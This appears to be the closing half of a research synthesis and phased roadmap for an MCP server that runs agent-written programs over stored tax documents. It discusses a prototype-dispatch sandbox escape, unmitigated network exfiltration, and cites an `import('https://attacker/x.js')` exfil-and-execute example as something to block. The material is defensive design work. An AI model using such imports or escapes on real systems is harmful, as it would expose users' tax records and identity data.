| A CAS blob cannot resolve bare specifiers | STACK, ARCHITECTURE, PITFALLS (all executed it) | Forces the `ctx`-injection ABI. Absent from all three planning documents. |
| `djs/parser` cannot validate programs | STACK, PITFALLS | Orchestrator-confirmed. |
| `--permission` is the right Week 1 control | STACK, PITFALLS (both executed the blocked cases) | Both also independently flag that it does not cover network. |

### Where they disagree, or one undercuts another

1. **`fjs_check` as "one feature, two problems" — FEATURES is undercut by STACK and PITFALLS.** FEATURES proposes `fjs_check(hash)` (parse/typecheck without executing) and calls it *"the same `djs/parser` source-validation that Week 5 wants for closing the `import()` hole. One feature, two problems."* That second half is dead (C1). **Resolution: keep `fjs_check`, drop the security claim.** It is still a real agent-productivity win — an agent's first program usually does not run, and a check tool shortens execute-fail-guess into check-fix-execute — but implement it as a *smoke check* (import under `--permission` in a child process, confirm `main` exists and returns an `Effect`), not as source validation, and score it as zero security value.

2. **Where heads get resolved — PITFALLS vs ARCHITECTURE.** PITFALLS says resolve heads *outside* the program and pass pinned hashes in; ARCHITECTURE puts `evoHead`/`evoList` **in** the guest whitelist for discovery. Both are right about something. **Resolution: keep `evoHead`/`evoList` in the whitelist (discovery is a real need and `casList` is correctly excluded), and require `fjs_run` to accept pinned inputs, record every head resolution in the read set — which `interpret` already accumulates for free — and mark the run record `pinned: true|false`.** Only pinned runs count toward Success Criterion 4. The marginal cost over ARCHITECTURE's design is one boolean; the marginal cost over PITFALLS' design is nothing, since the read set exists either way.

3. **PITFALLS assumed write-back costs CAS write in the whitelist; ARCHITECTURE showed it does not.** ARCHITECTURE is right, and this is the decisive correction to OQ5 (C8).

4. **`bigint` vs `number` for cents — STACK vs PITFALLS, mostly a layering confusion.** PITFALLS computes that integer cents in a JS `number` is exact to ~$9.0 × 10¹³ and calls `bigint` "optional insurance, not a necessity." STACK wants `bigint` cents plus exact **rationals**. ARCHITECTURE wants integer cents in a `number` guarded by `Number.isSafeInteger`, matching the `generation` precedent in `fjs/media/revision`. **These are about different layers and all three are right:** integer cents in a JSON `number`, `isSafeInteger`-guarded, at the **storage boundary**; `bigint`/rational **inside computation**; decimal **strings** on the MCP wire (verified: `fjs/media/json`'s `Primitive` has no `bigint`, so RTTI's `bigint` schema cannot cross the JSON-RPC wire). STACK's argument for rationals rather than a scaled decimal is the stronger one and should carry: phase-out ratios like `1/3` are not terminating decimals, and a rational defers the rounding decision *structurally* to the 1040 line — which is exactly what the IRS instruction *"include cents when adding and round off only the total"* requires.

5. **Consolidated `finance_*` tools — FEATURES vs ARCHITECTURE.** FEATURES cites Anthropic's consolidation guidance ("build high-leverage tools, not thin API wrappers") to argue for `finance_document_add` over a 3-call `cas_add` → `evo_add` sequence. ARCHITECTURE argues against building `finance_ingest` before the convention has been used once, because a wrapper freezes the subject convention into an interface prematurely. **Resolution: split by direction.** ARCHITECTURE's objection is specifically about the *write* path freezing an unproven convention — honour it: document the convention, use fjs's tools, add the wrapper when the repetition is real. It says nothing against the *read* tools, and FEATURES' `finance_schema`, `finance_tax_params`, and `finance_documents_list` should land early, because without them the agent guesses field names and hardcodes remembered parameter values.

6. **Worker threads — STACK vs PITFALLS, again not a real conflict.** STACK rules out `worker_threads` ("the Permission Model does not inherit to worker threads… not the right vehicle"); PITFALLS calls a worker "a cheap Week 1 win for reliability" because `worker.terminate()` is the *only* way to bound a synchronous runaway from outside. STACK is judging **isolation**, PITFALLS is judging **termination**, and both agree the child process is the eventual answer. Do not let the roadmapper read STACK as vetoing a worker used purely for cancellation.

7. **ARCHITECTURE's diagram still names ChatGPT as a client.** Superseded by C3.

---

## Implications for Roadmap

The existing five-week plan is structurally sound. What research changes is *what lands in each week* and the addition of a short correction phase in front. Phase numbers below map onto the plan's weeks so the roadmapper can reconcile rather than restart.

### Phase 0: Corrections and Integration Smoke Test
**Rationale:** PITFALLS is explicit that C1 *"should happen before anything else, because it invalidates a plan three documents depend on."* ARCHITECTURE independently argues that a server skeleton is an hour's work that retires the integration risk (stdio handshake, `claude mcp add` registration, Node version, launcher purity) nobody wants to discover in week four. Everything here is hours, and every item is more expensive later.
**Delivers:** Documents corrected (C1, C2, C3, C4, C9, C11 at minimum). A skeleton `financeMcpServer` composing fjs's two registries and nothing of ours, launched by a ~3-line impure `mcp.js`, registered with `claude mcp add` **carrying the `--permission` flags from the first registration** so the safe configuration is the only one anyone has. Own `McpConfig` at `2025-11-25`. Project-local CAS home, `.gitignore`'d. A CI assertion that stdout contains only JSON-RPC across a full session.
**Avoids:** Pitfall 1 (wrong threat model), Pitfall 2 (dissolving Week 5 plan), the stdout-pollution bug that "catches everyone once", C6's silent `tools/call` failure.
**Cost:** ~1 day. **Research needed:** none — assembly over verified exports, plus a 10-minute empirical protocol-version check.

### Phase 1: Execution Spine (plan Week 1, Track A)
**Rationale:** `interpret` is the riskiest component and depends on `fjs/effects` and *nothing else* — not CAS, not Evo, not MCP. Any ordering that builds it later carries the largest unknown for longer, for no reason. ARCHITECTURE's ordering correction matters: OQ5 blocks the **ABI** (what vocabulary the guest gets), not `fjs_run` — one step earlier than the Week 1 spec places it, which is why OQ5 had to be answered first.
**Delivers:**
1. `interpret(map)(effect)` as a pure, synchronous, recursion-only effect *translator* whose entries return `Effect`s rather than `Promise`s — with `Object.hasOwn` guard, `Object.create(null)` map, refusal messages that **name the permitted operations**, a read-set accumulator, and a step budget. Proofs under `fjs/effects/mock` including explicit regression cases for `constructor`, `toString`, `valueOf`, `hasOwnProperty`, and `__defineGetter__`.
2. The guest ABI (`ctx`) — combinators, four read-only operation constructors (`casRead`, `evoList`, `evoHead`, `evoRevision`), money helpers, `args`. **Frozen here.**
3. `fjs_run { hash, args?, subject?, parents? }` — `import_(cas.url(hash))` as an effect, content-hash-named materialization, a textual import-specifier allow-list enforced *before* materializing, tool-side write-back of result + `vnd.fjs.run` record, total error capture (including non-`Error` throws), and a size check before `writeResponse`.
4. The upstream report to fjs, with the reproduction attached.
**Addresses:** Restricted runner, clean refusal, `fjs_run`, effect vocabulary — all four Active requirements in this area.
**Avoids:** Pitfalls 1, 3, 4, 7, 8, 13.
**Research needed:** **No.** ARCHITECTURE already ran a working prototype of `interpret` under `mock`, including refusal and read-set recording, and both guard fixes are verified.

### Phase 2: Formats and Ingestion (plan Week 1, Track B — genuinely parallel with Phase 1)
**Rationale:** ARCHITECTURE verified that Track B's *formats* depend on nothing — not even on OQ2, which blocks only the ingestion convention. So dialect work can start immediately, and `todo/plan.md` overstates OQ2 as a Track B blocker. Money representation belongs here and not later: retrofitting `Cents` after report programs exist means rewriting all of them.
**Delivers:** `vnd.fjs.ocr` and `vnd.fjs.1099int` following `fjs/media/revision/module.f.js` literally (exact-literal `dialect` in the schema, derived `mediaType`, split structural/semantic validation, fjs's canonical JSON, `isSafeInteger` cents). Our own `detect` wrapper adding our dialects (fjs's hardcodes `vnd.fjs.revision` — file that upstream too). `fjs/exact/` money+rational+rounding with proofs including negatives. The subject convention (artifact hash; form-instance keys), the retraction story via `archived`, the CLI route for >128 KiB PDFs, and a cache-refresh tool.
**Convergence (the Week 1 finish line):** a stored program run through `fjs_run` that reads Track B's documents and returns total 1099-INT interest.
**Avoids:** Pitfalls 6, 10, 11.
**Research needed:** **No.** `fjs/media/revision` is a 123-line literal template and every payload field was read from the current IRS PDFs.

### Phase 3: One Correct Tax Figure (plan Week 2)
**Rationale:** `todo/plan.md` is right that Week 2 should start with a single unambiguous aggregate before brackets or filing status. Research adds what "correct" has to mean: line 16 cannot be bracket math, and the boundary tests are where subtle wrongness lives.
**Delivers:** TY2024 tax parameters as data with per-parameter Rev. Proc. citations. **The Tax Table stored as data**, diffed row by row against the published Pub. 1040 across the full income range as a `proof`. An explicit, tested line-16 method dispatch (`taxTable | taxComputationWorksheet | qdcgt | scheduleD | f8615 | foreignEarned`) with a proof per branch. Rounding applied at line boundaries only (`round(sum)`, never `sum(round)`), with a documented rule for negatives. `proof`s at `threshold − 1¢`, `threshold`, `threshold + 1¢` for every threshold in the parameter data. The self-explaining report line shape: `value` + `sources` + the rule/worksheet line it implements — designed so `{ value }` without `{ sources }` does not typecheck. A perturbation gate: change an input, assert the output moves.
**Uses:** `fjs/exact/`, `fjs/types/rtti`, the dialects from Phase 2.
**Avoids:** Pitfalls 5, 6, 8, 12.
**Research needed:** **YES.** The QDCGT worksheet and the Tax Table's low-end band structure were not read line-by-line from a current-year source by any researcher, and the two research files disagree on band widths. Read `i1040gi` and Pub. 1040 directly during planning.

### Phase 4: Document Breadth (plan Week 3)
**Rationale:** FEATURES identifies the sharpest ordering constraint in the project and it lands here: **adding 1099-DIV — one more "simple" dialect — silently adds the single largest computation in the scope**, because box 1b > 0 forces the QDCGT worksheet, and boxes 2b/2d force the strictly harder Schedule D Tax Worksheet. Decide this deliberately; do not let it arrive as a surprise.
**Delivers:** `vnd.fjs.w2` (box 12 as a list of (code, amount) pairs — TaxCalcBench names box-12 confusion as a real model failure; boxes 15–20 as a repeating array, stored and never computed), `vnd.fjs.1099div`, Schedule B thresholds, the scope guard with a declared coverage manifest, and worksheet-order discipline.
**Avoids:** Pitfall 9 — model IRS worksheet order **literally**, one named pure function per worksheet with the printed form's line numbers, and **never write a variable called `magi`** (the MAGI for the IRA deduction, Roth eligibility, the Premium Tax Credit, IRMAA, and the student-loan-interest deduction have *different* add-back lists; Pub. 590-A Worksheet 1-1 adds the IRA deduction back into its own MAGI by design).
**Research needed:** **YES.** MAGI add-back lists, phase-out cliff behaviour, and Schedule 1-A limitation mechanics are all real domain research.

### Phase 5: End-to-End on Real Documents and Acceptance (plan Week 4)
**Rationale:** unchanged from the plan, with three additions research says will otherwise be missed.
**Delivers:** Upload → parse → store → ask → program authored, stored, run → answer with citing hashes. **The adversarial re-run:** deliberately add an amended revision *between* two runs of a pinned program and assert byte-identical output (a reproducibility check that passes only because nothing changed is not a check). **The stale-cache test:** `npx functionalscript cas add` a blob mid-session and assert `evo_head` sees it without a restart. Line-by-line acceptance against the user's own filed TY2024 return, plus the TaxCalcBench corpus. Error paths: malformed documents, refused operations, non-`Error` throws, missing hashes, multi-head subjects (**refuse and ask** — ambiguity about which version of a tax document is never a good place for a default).
**Research needed:** **Partial.** 30 minutes to confirm whether TaxCalcBench's input format is directly consumable or needs a shim into `vnd.fjs.*`.

### Phase 6: Hardening and Upstream (plan Week 5)
**Rationale:** with C1 corrected, Week 5's content changes substantially. Process isolation is bounded work with no parser to get wrong; source validation is unbounded work with a long history of being broken.
**Delivers:** Child `node --permission` process execution — a hash on argv, JSON on stdout, killable on a wall-clock deadline. This is the *only* way to bound a synchronous runaway, so it is a reliability fix as much as a security one. Upstream contributions: `interpret` as a generic restricted runner, `fjs/exact/`, the CAS effect vocabulary, and the `detect` registry. TY2025 parameters (Rev. Proc. 2024-40 **as modified by 2025-32**) + Schedule 1-A Parts I/V/VI if the taxpayer is 65+.
**Explicitly NOT:** `djs/parser` source validation.
**Research needed:** **YES.** Child-process IPC design, the wall-clock kill path, and the upstream API shapes all warrant a phase-research pass.

### Phase Ordering Rationale

- **`interpret` first, because it depends on nothing.** Verified: it needs `fjs/effects` only. Building it later means carrying the largest unknown longer for no benefit.
- **OQ5 before the ABI, not before `fjs_run`.** It decides whether `casWrite` is in the guest vocabulary, which is an ABI question — one step earlier than the Week 1 spec places it.
- **Formats parallel with the spine.** Verified: they have zero dependencies, including on OQ2.
- **1099-DIV gates the QDCGT worksheet.** Schedule the worksheet with the dialect, not after it.
- **Money before report programs.** Retrofit cost is "rewrite every program" (recovery: MEDIUM–HIGH). The type costs an hour.
- **Subject model before any real document.** CAS has no delete; recovery is HIGH and permanent.

### Research Flags

**Phases likely needing `/gsd-research-phase`:**
- **Phase 3** — the QDCGT worksheet and the Tax Table's low-end band structure were not read line-by-line, and STACK and PITFALLS disagree on band widths. Highest-value research in the project.
- **Phase 4** — MAGI add-back lists per rule, phase-out cliff behaviour (§32(i) documented as a $3,455 cliff on one extra cent of interest), Schedule 1-A limitation mechanics.
- **Phase 6** — child-process isolation design and upstream API shapes.

**Phases with standard patterns (skip research):**
- **Phase 0** — assembly over exports verified by reading the installed package.
- **Phase 1** — a working prototype of `interpret` already exists, both guard fixes are verified, and the `import()` mechanics (extensionless, `data:`, bare specifiers, ESM cache keyed by URL and never evicted) were all executed.
- **Phase 2** — `fjs/media/revision` is a literal template and every payload field was read from a current IRS PDF.
- **Phase 5** — mostly assembly, with 30 minutes on the TaxCalcBench input format.

---

## Sequencing Implications

### Materially more expensive if deferred (front-load these)

| Item | Why deferral is expensive |
|---|---|
| `Cents`/money representation | Retrofitting after report programs exist means rewriting all of them. Recovery: MEDIUM–HIGH. The type costs an hour. |
| `fjs_run`'s pinned-input signature | Breaking signature change plus a rewrite of every program written against it. |
| Guest ABI (`ctx`) freeze | Every stored program is written against it — the widest blast radius of any interface here. |
| Evo subject model | **CAS has no delete.** Wrong subjects linger forever; migration means rewriting every revision. Recovery: HIGH. |
| Storing the OCR artifact | A transient OCR step forecloses deterministic reclassification *permanently* — you cannot recover what the model saw. |
| Report line type requiring `sources` | This is what makes Criterion 3 the enforcement mechanism for Criterion 4; adding it later means rewriting programs. |
| Project-local CAS home | Once real SSNs are in the shared `~/.cas`, there is no delete and no partial recovery. |
| Correcting the `djs/parser` claim | Cost of discovering it in Week 5 is a blown week and a re-litigated security decision. |

### Near-free if done early

| Item | Cost |
|---|---|
| Own `McpConfig` at `2025-11-25` | ~0.1 dev-days. Highest value-per-minute item in the corpus. |
| `--permission` flags in the `claude mcp add` registration | ~0.5 dev-days — and registering later means the *unsafe* configuration is the one everyone already has. |
| Server skeleton integration smoke test | ~1 hour; retires the integration risk entirely. |
| Step budget in the effect loop | ~5 lines. |
| Import-specifier allow-list | ~20 lines, and it blocks the `import('https://attacker/x.js')` exfil-and-execute variant completely. |
| CAS-read count + numeric-literal audit in the run result | ~10 lines; catches the blatant hardcoded-answer case and is genuinely useful to show the user. |
| Empirical protocol-version check | 10 minutes; removes a whole class of "why won't it call my tool" debugging. |
| Content-hash-named materialization | Free, and it turns the never-evicting ESM cache from a hazard (reused temp filename silently re-runs the *first* program) into a feature (re-running the same hash is genuinely cheap). |

### Where a security fix coincides with an already-scheduled task

This is the most important scheduling observation in the corpus, and it means the highest-severity finding costs **nothing** to fix:

- **The `Object.hasOwn` guard IS the already-planned "clean refusal" work.** `todo/plan.md` Week 1 Track A step 3 and PROJECT.md's requirement *"Unknown operations fail as a clean, reported error (`operation not permitted: fetch`), not the raw `TypeError` that `match` produces today"* describe the same code change that closes the verified `__defineGetter__` escape. One change delivers the refusal message, closes the soundness hole, and produces the upstream report. Zero net schedule cost — it is already on the Week 1 board, and the plan already calls step 3 "the real work."
- **`fjs_run`'s pinned-input signature IS the reproducibility fix.** Answering the "does it take arguments?" question correctly satisfies Success Criterion 4 at the same time.
- **Writing the result to CAS IS simultaneously** the traceability mechanism (Criterion 3), the 1040-X diff substrate, and the workaround for the 128 KiB line cap.
- **`Object.create(null)` plus the guard is defense in depth for free** — do both, so a future runner that bypasses the wrapper still has no prototype to reach.

One anti-coincidence worth naming: **closing `import()` without fixing `match` is worse than doing neither**, because it ships a runner advertised as sandboxed that a five-line program escapes. Fix both or neither.

---

## What Still Needs the User, Not Research

No amount of investigation settles these. Each one changes scope, and several change it by a whole tier.

1. **Is ChatGPT a hard requirement?** If yes, stdio is disqualified and the project needs HTTPS + OAuth — a separate milestone that also invalidates the argument making the `import()` hole tolerable. If no (recommended), amend the goal statement to name Claude. This is the single highest-leverage question in the list.
2. **Which tax year does the user have a filed return for, and will they share it?** Research recommends TY2024 on the strength of Success Criterion 1, but only the user knows what exists.
3. **Taxpayer facts that add or remove entire tiers:** Is the taxpayer 65+? (decides Schedule 1-A Parts I/V/VI — worth up to $6,000/$12,000, and a 65+ 2025 return cannot be right without it). Are there brokerage *sales*? (decides 1099-B/8949/Schedule D, and drags multi-year support forward via capital loss carryover). Dependents? (Schedule 8812). Do they itemize? (Schedule A only wins above $15,750/$31,500).
4. **Risk acceptance on exfiltration.** `--permission` covers filesystem, child processes, worker threads, native addons, WASI, and the inspector — **not network**. `fetch` remains available to an imported module's top-level body, so exfiltration of the complete tax record is unmitigated in-process. Accept it explicitly, or add an OS-level control (container, `sandbox-exec`, egress firewall rule). This is a judgement call about a low-probability, catastrophic-impact risk, and "nothing bad happened" is the expected observation either way.
5. **The retraction policy.** What happens when the wrong document is ingested — a spouse's return, a client's 1099, a screenshot with a password? There is no delete. Does `archived: true` on a superseding revision count as retraction, and must report programs filter archived revisions? Decide before real documents exist; retroactive fixes here are not fixes.
6. **OQ4 — deadline and definition of done.** Is an external date driving the five weeks?
7. **Whether TaxCalcBench becomes the acceptance harness.** A scope and licensing judgement, plus 30 minutes verifying the input format.
8. **The user-facing framing of the output.** Research recommends "reviewed estimate — review against your documents before filing" alongside the year, program hash, and parameter-set hash. The actual harm this project can cause is a user transcribing a wrong number onto a filed return, so this is the user's call to make explicitly.

---

## Confidence Assessment

| Area | Confidence | Notes |
|------|------------|-------|
| Stack | **HIGH** | Every fjs claim read from the installed `node_modules/functionalscript@0.40.0`; Permission Model, import mechanics, and specifier resolution all executed locally. MEDIUM on external-ecosystem claims: MCP client behaviour rests partly on a single detailed report, and the Tax Table's $50-band assumption was not confirmed against a current-year Pub. 1040. |
| Features | **HIGH** | Every line number, box list, and threshold read directly from current IRS PDFs with creation dates noted. Agent/tool design from official Anthropic engineering guidance. MEDIUM on traceability comparisons (vendor marketing and support forums) and competitor engine internals (README-level). Two worksheets (QDCGT, Social Security Benefits) not read line-by-line — flagged by the researcher. |
| Architecture | **HIGH** | Verified against the installed package including exact line numbers, plus executed prototypes: the `match` prototype dispatch, extensionless import, bare-specifier failure, a zero-import guest program under `asyncRun`, and `interpret` under `fjs/effects/mock` with refusal and read-set recording both working. MEDIUM only on the comparative-systems reasoning (Perkeep/Git/Datomic/IPFS) behind the subject-model recommendation — that is analogy, not verification. |
| Pitfalls | **HIGH** | fjs findings verified against vendored source and executed on Node 23.11; the `__defineGetter__` escape reproduced end to end and independently confirmed by the orchestrator. IRS mechanics verified against instructions and cross-checked against independent engines. MEDIUM on threat-landscape probability estimates — the attack-success figures are benchmark numbers, not measurements of this system. |

**Overall confidence: HIGH.** The unusual property of this corpus is that its highest-severity findings are the *most* verified ones: the sandbox escape was reproduced by two researchers and the orchestrator, the `djs/parser` gap is a type declaration anyone can read, the 128 KiB cap was traced through four modules to a single constant, and the ChatGPT limitation was confirmed against current public documentation. Nothing load-bearing rests on inference.

### Gaps to Address

| Gap | How to handle |
|---|---|
| **Tax Table band widths at the low end** — STACK assumed uniform $50, PITFALLS found $5/$10/$25/$50 varying by income. Neither read a current Pub. 1040 in full. | Store the table as data and diff **every row** against the published table as a `proof`, before Phase 3 closes. That single test is worth more than further reading. |
| **QDCGT worksheet and Social Security Benefits Worksheet** not read line-by-line (they live inside `i1040gi`, not as standalone PDFs). | Phase 3 research pass. Read before estimating the work — the QDCGT worksheet is ~25 lines and is the largest single computation in v1. |
| **Claude Code / Claude Desktop protocol-version behaviour** rests on one public report. | 10-minute empirical check in Phase 0: pipe `initialize` at `2024-11-05` and `2025-11-25`, diff, then connect the real client and confirm a `tools/call` actually arrives. |
| **TaxCalcBench input-format consumability** unverified. | 30 minutes on `github.com/column-tax/tax-calc-bench` before committing to it as the acceptance harness. |
| **Schedule 1-A limitation/phase-out mechanics** out of scope for this pass. | Only matters if the taxpayer is 65+ and the year is 2025+. Read the Schedule 1-A instructions when that is confirmed. |
| **Box lists for 1099-R, SSA-1099, 1099-OID, 1099-MISC, 1099-DA** not verified. | Read from the IRS PDFs before designing those dialects. Do not rely on recall — the researcher who verified the others flagged this explicitly. |
| **Whether `--permission`'s missing network permission is acceptable** | User decision (see above). The OS-level alternatives (container, `sandbox-exec`, egress rules) were named but not evaluated in depth. |
| **Whether source validation is worth attempting at all post-C1** | Decide after the `--permission` launcher has been running and real refusal errors have been observed. It is no longer a security necessity. |

---

## Sources

### Primary (HIGH confidence)

**Read or executed against the installed `functionalscript@0.40.0`:**
`fjs/effects/module.f.js:282` (`match`, and the prototype-dispatch escape) · `fjs/effects/module.js` (`asyncRun`'s unbounded loop) · `fjs/effects/mock`, `fjs/effects/memory` · `fjs/effects/node/module.f.d.ts:133` (`Import`) and `module.js:64` (`sandbox` is timing, not isolation) · `fjs/effects/node/virtual` (`JsModule`) · `fjs/cas/module.f.js` (`fileCas`, `toPath`, `url`, `collectRead`) and `module.f.d.ts` (no delete) · `fjs/cas/evo/module.f.js` (`headsOf`, `resolveSnapshot`, `validateParentSubjects`, `buildCache`, `syncRevision`) · `fjs/mcp/module.f.js:45,50-55` (`casMcpHandlers`, `casConfig`'s `2024-11-05` pin) · `fjs/mcp/cas/module.f.js:149` (128 KiB inline cap and the CLI escape hatch) · `fjs/protocol/mcp/module.f.js:199-245` (version echo, lifecycle) · `fjs/protocol/mcp/stdio/module.f.js` (`tryUtf8` overflow degradation) · `fjs/media/revision/module.f.js` (the dialect template) and `fjs/media/module.f.js` (`detect` hardcodes one dialect) · `fjs/djs/ast/module.f.d.ts` and `module.f.js` (no function node; functions are an upstream TODO) · `fjs/djs/parser/module.f.js` · `fjs/js/`, `fjs/fsc/`, `fjs/bnf/` (no JS parser) · `fjs/types/bigfloat/`, `fjs/types/bigint/module.f.js` (`maxLength = 0x100000n`), `fjs/types/prime_field/`, `fjs/types/rtti/` · `fjs/module.f.js:46` (`fjs r` calls `main`)

**Executed experiments (Node 23.11; CI targets Node 26):** `match` prototype dispatch and the `__defineGetter__` escalation · `Object.hasOwn` vs `in` vs `!== undefined` guard comparison · `interpret` under `fjs/effects/mock` with refusal and read-set recording · extensionless dynamic import · bare-specifier failure from a CAS-shaped path and success with a `node_modules` symlink · `data:` URL import and its `ERR_UNSUPPORTED_RESOLVE_REQUEST` on bare specifiers · ESM cache runs a body once per URL · `node:fs`/`fetch`/`child_process` reachable without flags, `ERR_ACCESS_DENIED` under `--permission`, stdio unaffected · float and rounding behaviour (`1.005 * 100`, `Math.round(-2.5)`, `toFixed` inconsistency)

**IRS primary sources:** Form 1040 (2025, created 9/5/25) · Schedule 1 · **Schedule 1-A (created 11/4/25)** · Schedule B · Schedule D · Form 8949 · Form W-2 · Form 1099-INT (Rev. 1-2024) · Form 1099-DIV (Rev. 1-2024) · Schedule K-1 (1065) · Instructions for Form 1040 (`i1040gi`) — rounding rule and line-16 method selection · Publication 1040 (Tax Tables) · Publication 590-A — Worksheet 1-1 MAGI add-backs, Appendix B circularity · Instructions for Form 1040-X · Rev. Proc. 2024-40 and **Rev. Proc. 2025-32** · Notice 2025-62 (TY2025 tips/overtime penalty relief) · "How long should I keep records?" · PTIN requirements

**Official documentation:** nodejs.org/api/permissions.html · modelcontextprotocol.io versioning and 2026-07-28 spec · Anthropic, "Writing effective tools for AI agents" · Tax-Calculator LICENSE (CC0 1.0, verified) and `policy_current_law.json` · PolicyEngine-US license (AGPL-3.0, verified — reference only, do not copy)

### Secondary (MEDIUM confidence)

TaxCalcBench (arXiv 2507.16126) and `github.com/column-tax/tax-calc-bench` · `opentax-engine` (bigint-cents invariant, Tax Table reproduction against 41 sampled rows, 279 golden fixtures, §32(i) cliff) · Filed `opentax`, OpenTaxSolver · Node 26 and TypeScript 7.0 release coverage · CVE-2026-22709 (vm2 sandbox escape) · tc39/proposal-shadowrealm (Stage 2.7) · OpenAI Developer Mode documentation (ChatGPT MCP requires remote HTTPS) · Perkeep permanodes, Datomic identity/lookup refs, DefraDB, IPFS/IPLD · TurboTax QuickZoom/Data Source, SurePrep SPbinder/1040SCAN, TaxCaddy · Paperless-ngx · Schwab and Raymond James composite 1099 documentation · OWASP MCP Tool Poisoning, Invariant Labs, CyberArk, Cloud Security Alliance indirect-injection research · ImpossibleBench, EvilGenie, SpecBench

### Tertiary (LOW confidence — flagged, needs validation)

- thingsboard-mcp issue #35 — Claude Desktop silently refusing `tools/call` against a `2024-11-05` server. One detailed report, not reproduced here. Motivates the `2025-11-25` pin but is not proof; the pin is worth doing anyway because it is nearly free.
- Tax Table $50-band midpoint derivation from secondary sources including IRS SOI publications — **contradicted in detail** by PITFALLS' finding of $5/$10/$25/$50 widths. Must be closed by a generated-vs-published row-by-row diff.
- Threat-landscape probability figures (MCPTox ~73% tool-poisoning success; Google's ~32% relative growth in injection-carrying crawled pages) — benchmark and telemetry numbers, not measurements of this system. They justify treating the risk as real; they do not quantify it here.

---
*Research completed: 2026-08-03*
*Ready for roadmap: yes — but Phase 0's document corrections (C1, C2, C3, C4) should land before roadmap items are written against the current text of `todo/plan.md` and `fjs/todo/implement-mcp-server.md`.*
